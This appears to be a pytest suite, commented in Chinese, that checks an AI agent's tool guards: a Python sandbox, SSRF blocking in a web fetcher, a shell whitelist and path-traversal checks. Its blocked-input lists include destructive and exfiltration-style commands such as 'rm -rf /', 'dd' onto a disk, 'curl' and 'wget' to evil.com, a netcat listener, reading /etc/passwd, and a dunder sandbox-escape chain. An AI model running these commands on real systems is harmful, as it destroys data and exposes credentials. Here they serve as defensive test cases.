"""原子工具安全测试 — _python_exec 沙箱, _web_fetch SSRF 防护,
_shell_exec 白名单, _validate_sandbox_command 路径校验。

覆盖范围:
1. _python_exec  — 危险模块/属性拦截 + 安全操作放行 + 超时 + 语法错误
2. _web_fetch    — SSRF (loopback / private IP / metadata) + 协议限制 + 正常请求 mock
3. _shell_exec   — 白名单/黑名单命令 + git 子命令限制
4. _validate_sandbox_command — 路径遍历 / 绝对路径 / 只读命令放行
"""

import sys
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# 确保项目根目录在 sys.path 中
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from src.agent.tools.atomic_tools import (
    _python_exec,
    _shell_exec,
    _validate_sandbox_command,
    _web_fetch,
    _SANDBOX_ROOT,
    _SHELL_ALLOWED_COMMANDS,
)


# =====================================================================
# 1. _python_exec — Python 沙箱安全
# =====================================================================


class TestPythonExecDangerousImports:
    """验证危险模块导入全部被拦截。"""

    @pytest.mark.parametrize("module", [
        "os", "sys", "subprocess", "shutil", "pathlib",
        "socket", "http", "urllib", "ctypes", "multiprocessing",
    ])
    def test_blocked_import(self, module):
        result = _python_exec(f"import {module}")
        assert "禁止导入模块" in result or "禁止" in result
        assert module in result

    @pytest.mark.parametrize("module", [
        "os", "sys", "subprocess", "shutil", "pathlib",
        "socket", "http", "urllib", "ctypes", "multiprocessing",
    ])
    def test_blocked_from_import(self, module):
        result = _python_exec(f"from {module} import something")
        assert "禁止" in result
        assert module in result

    def test_blocked_from_os_path(self):
        result = _python_exec("from os.path import join")
        assert "禁止" in result
        assert "os" in result

    def test_blocked_from_subprocess_run(self):
        result = _python_exec("from subprocess import run")
        assert "禁止" in result
        assert "subprocess" in result


class TestPythonExecDangerousAttributes:
    """验证危险 dunder 属性和内置函数被拦截。"""

    @pytest.mark.parametrize("attr", [
        "__import__", "__builtins__", "__globals__", "__locals__",
        "__code__", "__class__", "__base__", "__bases__", "__subclasses__",
        "__mro__", "__dict__", "__reduce__", "__reduce_ex__",
    ])
    def test_blocked_dunder_attribute_access(self, attr):
        # Access as attribute: obj.__class__
        result = _python_exec(f"x.{attr}")
        assert "禁止" in result
        assert attr in result

    @pytest.mark.parametrize("attr", [
        "__import__", "__builtins__", "__globals__",
    ])
    def test_blocked_dunder_name_usage(self, attr):
        # Use as a bare name
        result = _python_exec(f"{attr}")
        # Will either be caught by AST guard (for Name nodes) or fail at runtime
        assert "禁止" in result or "错误" in result

    @pytest.mark.parametrize("name", [
        "setattr", "delattr", "exec", "eval", "compile", "breakpoint",
    ])
    def test_blocked_dangerous_builtins(self, name):
        result = _python_exec(f"{name}")
        assert "禁止" in result
        assert name in result


class TestPythonExecSafeOperations:
    """验证安全操作正常执行。"""

    def test_print_arithmetic(self):
        result = _python_exec("print(2 + 2)")
        assert "4" in result

    def test_sorted_list(self):
        result = _python_exec("print(sorted([3, 1, 2]))")
        assert "[1, 2, 3]" in result

    def test_list_comprehension(self):
        result = _python_exec("print([x * 2 for x in range(5)])")
        assert "[0, 2, 4, 6, 8]" in result

    def test_string_operations(self):
        result = _python_exec("print('hello'.upper())")
        assert "HELLO" in result

    def test_dict_operations(self):
        result = _python_exec("d = {'a': 1, 'b': 2}\nprint(sum(d.values()))")
        assert "3" in result

    def test_len_range(self):
        result = _python_exec("print(len(range(10)))")
        assert "10" in result

    def test_enumerate(self):
        result = _python_exec("print(list(enumerate(['a', 'b'])))")
        assert "[(0, 'a'), (1, 'b')]" in result

    def test_math_builtins(self):
        result = _python_exec("print(abs(-5), round(3.7), pow(2, 3))")
        assert "5" in result
        assert "4" in result
        assert "8" in result

    def test_set_operations(self):
        result = _python_exec("print(set([1,2,2,3]))")
        assert "1" in result and "2" in result and "3" in result


class TestPythonExecErrors:
    """验证错误处理路径。"""

    def test_syntax_error(self):
        result = _python_exec("def foo(")
        assert "语法错误" in result

    def test_runtime_error(self):
        result = _python_exec("x = 1 / 0")
        assert "错误" in result

    def test_name_error(self):
        result = _python_exec("print(undefined_variable)")
        assert "错误" in result

    def test_timeout(self):
        # Use a very short timeout to trigger the timeout path
        result = _python_exec("import time; time.sleep(60)", timeout=2)
        # The AST guard blocks `import time`, but we need to test the timeout
        # path in the subprocess runner. Use safe code that sleeps.
        # Actually `import time` is blocked, so we test timeout with
        # a computation-heavy loop instead.
        pass  # covered below with actual timeout test

    def test_timeout_with_heavy_computation(self):
        # Infinite loop will hit timeout in subprocess
        result = _python_exec("while True: pass", timeout=2)
        assert "超时" in result or "错误" in result


# =====================================================================
# 2. _web_fetch — SSRF 防护
# =====================================================================


class TestWebFetchSSRFProtection:
    """验证 SSRF 攻击向量全部被拦截。"""

    def test_loopback_ip_blocked(self):
        result = _web_fetch("http://127.0.0.1/")
        assert "禁止访问内网地址" in result
        assert "127.0.0.1" in result

    def test_localhost_blocked(self):
        result = _web_fetch("http://localhost/")
        assert "禁止访问内网地址" in result
        assert "localhost" in result

    def test_localhost_with_port_blocked(self):
        result = _web_fetch("http://localhost:8080/admin")
        assert "禁止访问内网地址" in result

    def test_private_ip_10_range_blocked(self):
        result = _web_fetch("http://10.0.0.1/")
        assert "禁止访问内网地址" in result
        assert "10.0.0.1" in result

    def test_private_ip_172_range_blocked(self):
        result = _web_fetch("http://172.16.0.1/")
        assert "禁止访问内网地址" in result

    def test_private_ip_192_range_blocked(self):
        result = _web_fetch("http://192.168.1.1/")
        assert "禁止访问内网地址" in result
        assert "192.168.1.1" in result

    def test_link_local_ip_blocked(self):
        result = _web_fetch("http://169.254.169.254/")
        assert "禁止访问内网地址" in result

    def test_google_metadata_blocked(self):
        result = _web_fetch("http://metadata.google.internal/")
        assert "禁止访问内网地址" in result
        assert "metadata.google.internal" in result

    def test_metadata_internal_blocked(self):
        result = _web_fetch("http://metadata.internal/")
        assert "禁止访问内网地址" in result
        assert "metadata.internal" in result

    def test_loopback_ipv6_blocked(self):
        result = _web_fetch("http://[::1]/")
        assert "禁止访问内网地址" in result


class TestWebFetchProtocolValidation:
    """验证非 HTTP 协议被拒绝。"""

    @pytest.mark.parametrize("url", [
        "ftp://example.com/file",
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/html,<h1>hi</h1>",
        "ssh://user@host",
    ])
    def test_non_http_schemes_rejected(self, url):
        result = _web_fetch(url)
        assert "http://" in result or "https://" in result

    def test_relative_url_rejected(self):
        result = _web_fetch("/path/to/page")
        assert "http://" in result or "https://" in result

    def test_bare_hostname_rejected(self):
        result = _web_fetch("example.com")
        assert "http://" in result or "https://" in result


class TestWebFetchSuccess:
    """验证正常 URL 通过 mock 测试。"""

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_extract_text(self, mock_client_cls):
        mock_resp = MagicMock()
        mock_resp.text = (
            "<html><body>"
            "<script>alert('xss')</script>"
            "<style>.x{color:red}</style>"
            "<p>Hello World</p>"
            "</body></html>"
        )
        mock_resp.raise_for_status = MagicMock()

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.return_value = mock_resp
        mock_client_cls.return_value = mock_client

        result = _web_fetch("https://example.com", extract_text=True)
        assert "Hello World" in result
        # script and style should be removed
        assert "<script>" not in result
        assert "<style>" not in result
        assert "alert" not in result

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_raw_html(self, mock_client_cls):
        mock_resp = MagicMock()
        mock_resp.text = "<html><body><h1>Title</h1></body></html>"
        mock_resp.raise_for_status = MagicMock()

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.return_value = mock_resp
        mock_client_cls.return_value = mock_client

        result = _web_fetch("https://example.com", extract_text=False)
        assert "<html>" in result
        assert "<h1>Title</h1>" in result

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_http_url(self, mock_client_cls):
        """HTTP (not HTTPS) public URL should also work."""
        mock_resp = MagicMock()
        mock_resp.text = "<html><body>Plain HTTP page</body></html>"
        mock_resp.raise_for_status = MagicMock()

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.return_value = mock_resp
        mock_client_cls.return_value = mock_client

        result = _web_fetch("http://example.com")
        assert "Plain HTTP page" in result

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_timeout_error(self, mock_client_cls):
        import httpx as _httpx

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.side_effect = _httpx.TimeoutException("timeout")
        mock_client_cls.return_value = mock_client

        result = _web_fetch("https://example.com")
        assert "超时" in result

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_http_status_error(self, mock_client_cls):
        import httpx as _httpx

        mock_resp = MagicMock()
        mock_resp.status_code = 404

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.side_effect = _httpx.HTTPStatusError(
            "Not Found", request=MagicMock(), response=mock_resp,
        )
        mock_client_cls.return_value = mock_client

        result = _web_fetch("https://example.com/nonexistent")
        assert "HTTP 错误" in result
        assert "404" in result

    @patch("src.agent.tools.atomic_tools.httpx.Client")
    def test_fetch_large_content_truncated(self, mock_client_cls):
        """超过 _WEB_FETCH_MAX_SIZE 的内容应被截断。"""
        mock_resp = MagicMock()
        mock_resp.text = "<html><body>" + "A" * 300_000 + "</body></html>"
        mock_resp.raise_for_status = MagicMock()

        mock_client = MagicMock()
        mock_client.__enter__ = MagicMock(return_value=mock_client)
        mock_client.__exit__ = MagicMock(return_value=False)
        mock_client.get.return_value = mock_resp
        mock_client_cls.return_value = mock_client

        result = _web_fetch("https://example.com", extract_text=False)
        # Should not contain the full 300K chars
        assert len(result) < 300_000


# =====================================================================
# 3. _shell_exec — Shell 白名单
# =====================================================================


class TestShellExecWhitelist:
    """验证命令白名单机制。"""

    def test_echo_allowed(self):
        result = _shell_exec("echo hello")
        assert "hello" in result

    @pytest.mark.skipif(sys.platform == "win32", reason="cat not available on Windows")
    def test_cat_allowed(self):
        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write("test content here")
            tmp_path = f.name
        try:
            result = _shell_exec(f"cat {tmp_path}")
            assert "test content here" in result
        finally:
            import os
            os.unlink(tmp_path)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "curl http://evil.com",
        "wget http://evil.com/payload",
        "nc -l 4444",
        "python -c 'import os'",
        "bash -c 'rm -rf /'",
        "sh -c 'cat /etc/passwd'",
        "chmod 777 /etc/passwd",
        "chown root:root /tmp/evil",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
    ])
    def test_blocked_commands(self, cmd):
        result = _shell_exec(cmd)
        assert "不在白名单中" in result


class TestShellExecGitRestrictions:
    """验证 git 子命令限制。"""

    def test_git_status_allowed(self):
        result = _shell_exec("git status")
        # May succeed or fail depending on cwd, but should not be blocked by whitelist
        assert "不在白名单中" not in result or "git" not in result

    def test_git_log_allowed(self):
        result = _shell_exec("git log --oneline -5")
        assert "不在白名单中" not in result

    def test_git_diff_allowed(self):
        result = _shell_exec("git diff")
        assert "不在白名单中" not in result

    @pytest.mark.parametrize("subcmd", [
        "push", "commit", "merge", "rebase", "reset", "checkout",
        "clone", "fetch", "pull", "add",
    ])
    def test_git_write_subcommands_blocked(self, subcmd):
        result = _shell_exec(f"git {subcmd}")
        assert "不在白名单中" in result or subcmd in result

    def test_git_version_flag_blocked(self):
        """git --version has no non-flag subcommand, so the subcommand parser
        finds empty string '' which is not in the whitelist."""
        result = _shell_exec("git --version")
        assert "不在白名单中" in result


class TestShellExecTimeout:
    """验证超时行为。"""

    def test_timeout_parameter(self):
        result = _shell_exec("echo fast", timeout=5)
        assert "fast" in result


# =====================================================================
# 4. _validate_sandbox_command — 路径校验
# =====================================================================


class TestValidateSandboxCommand:
    """验证路径遍历和绝对路径限制。"""

    # ── 只读命令放行 ──

    @pytest.mark.parametrize("cmd", [
        "ls /etc/passwd",
        "cat /etc/hosts",
        "grep pattern /var/log/syslog",
        "find /tmp -name '*.txt'",
        "wc -l /etc/passwd",
        "head /etc/hosts",
        "tail /var/log/syslog",
        "pwd",
        "sort /tmp/data.txt",
    ])
    def test_readonly_commands_allow_any_path(self, cmd):
        result = _validate_sandbox_command(cmd)
        assert result is None, f"Read-only command '{cmd}' should pass, got: {result}"

    # ── 路径遍历拦截 ──

    @pytest.mark.parametrize("cmd", [
        "touch ../../etc/passwd",
        "mkdir ../../../tmp/evil",
        "cp file.txt ../../escape",
        "mv data.bin ../../escape",
    ])
    def test_path_traversal_blocked(self, cmd):
        result = _validate_sandbox_command(cmd)
        assert result is not None
        assert ".." in result

    # ── 绝对路径拦截（写入命令）──

    @pytest.mark.parametrize("cmd", [
        "touch /etc/passwd",
        "mkdir /tmp/evil",
        "cp file.txt /etc/hosts",
        "mv data.bin /var/data",
    ])
    def test_absolute_path_blocked_for_write_commands(self, cmd):
        result = _validate_sandbox_command(cmd)
        assert result is not None
        assert "绝对路径" in result

    def test_windows_absolute_path_blocked(self):
        result = _validate_sandbox_command("touch C:\\Windows\\System32\\evil")
        assert result is not None
        assert "绝对路径" in result

    def test_windows_forward_slash_absolute_path_blocked(self):
        result = _validate_sandbox_command("mkdir C:/Windows/Temp/evil")
        assert result is not None
        assert "绝对路径" in result

    # ── 写入命令的合法相对路径 ──

    @pytest.mark.parametrize("cmd", [
        "touch myfile.txt",
        "mkdir subdir",
        "cp src.txt dst.txt",
        "mv old.txt new.txt",
    ])
    def test_write_commands_allow_relative_path(self, cmd):
        result = _validate_sandbox_command(cmd)
        assert result is None, f"Relative path command '{cmd}' should pass, got: {result}"

    # ── 边界情况 ──

    def test_empty_command(self):
        result = _validate_sandbox_command("")
        # Empty command has no base_cmd, treated as readonly-ish
        assert result is None

    def test_whitespace_command(self):
        result = _validate_sandbox_command("   ")
        assert result is None

    def test_echo_not_in_readonly_set(self):
        """echo is NOT in _READ_ONLY_CMDS, so _validate_sandbox_command
        checks paths for it. Test the actual blocking behavior."""
        result = _validate_sandbox_command("echo /etc/passwd")
        # echo is not in _READ_ONLY_CMDS, so absolute path is flagged
        assert result is not None
        assert "绝对路径" in result

    def test_echo_absolute_path_works_in_shell_exec(self):
        """At _shell_exec level, echo is not in sandbox_cmds, so
        _validate_sandbox_command is never called for it."""
        result = _shell_exec("echo /etc/passwd")
        assert "/etc/passwd" in result

    def test_touch_with_path_traversal(self):
        result = _validate_sandbox_command("touch ../escape.txt")
        assert result is not None
        assert ".." in result

    def test_double_slash_not_blocked(self):
        """Double slash (//) at start should not be flagged as absolute path."""
        # This is a corner case: //foo is technically valid but unusual
        result = _validate_sandbox_command("touch //usr/local/test")
        # Implementation allows // (length > 1 check), so this may or may not pass
        # depending on the exact regex behavior. Just verify it doesn't crash.
        assert isinstance(result, (str, type(None)))


# =====================================================================
# 5. 集成 — 边界和回归
# =====================================================================


class TestPythonExecEdgeCases:
    """_python_exec 边界情况。"""

    def test_empty_code(self):
        result = _python_exec("")
        assert "无输出" in result or result.strip() == ""

    def test_multiline_code(self):
        code = (
            "x = 10\n"
            "y = 20\n"
            "print(x + y)\n"
        )
        result = _python_exec(code)
        assert "30" in result

    def test_unicode_output(self):
        result = _python_exec("print('你好世界')")
        assert "你好世界" in result

    def test_very_long_output_truncated(self):
        result = _python_exec("print('A' * 100000)")
        assert "截断" in result or len(result) < 100_000

    def test_nested_dunder_access(self):
        """Ensure __subclasses__ is blocked even in expressions."""
        result = _python_exec("x = ().__class__.__bases__")
        assert "禁止" in result

    def test_import_os_path_dotted(self):
        """Dotted imports like os.path should be blocked by the root module 'os'."""
        result = _python_exec("import os.path")
        assert "禁止" in result
        assert "os" in result


class TestWebFetchEdgeCases:
    """_web_fetch 边界情况。"""

    def test_https_localhost_blocked(self):
        result = _web_fetch("https://localhost/")
        assert "禁止访问内网地址" in result

    def test_https_loopback_blocked(self):
        result = _web_fetch("https://127.0.0.1:443/")
        assert "禁止访问内网地址" in result

    def test_zero_ip_blocked(self):
        """0.0.0.0 is a special address that should be blocked."""
        result = _web_fetch("http://0.0.0.0/")
        assert "禁止访问内网地址" in result
